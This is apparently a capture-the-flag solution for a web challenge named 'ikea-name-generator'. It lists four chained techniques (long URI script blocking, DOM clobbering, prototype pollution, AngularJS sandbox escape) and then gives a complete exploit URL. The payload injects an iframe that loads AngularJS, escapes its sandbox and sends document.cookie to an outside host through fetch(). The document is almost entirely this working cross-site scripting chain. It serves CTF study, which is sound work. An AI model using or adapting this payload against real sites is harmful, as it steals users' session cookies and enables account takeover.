1. Long Request-URI to block a script with CONFIG initialization
2. DOM Clobbering
3. Prototype Pollution
4. AngularJS Sandbox Escape

```
http://ikea-name-generator.chal.perfect.blue/?name=%3Cx%20id=CONFIG%3E%3Ca%20id=CONFIG%20name=url%20href=%27404.php?msg={%22__proto__%22:{%22innerHTML%22:%22%3Ciframe%20srcdoc=\u0027%3Cscript%20src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js%3E%3C/script%3E%3Cdiv%20ng-app%20ng-csp%3E%3Cinput%20autofocus%20ng-focus=\u0026apos;$event.path|orderBy:\u0022(z=fetch)(\\u0022https://blackfan.ru/admin?\\u0022%252bdocument.cookie)\u0022\u0026apos;%3E%3C/div%3E\u0027%3E%3C/iframe%3E%22}}%27%
```
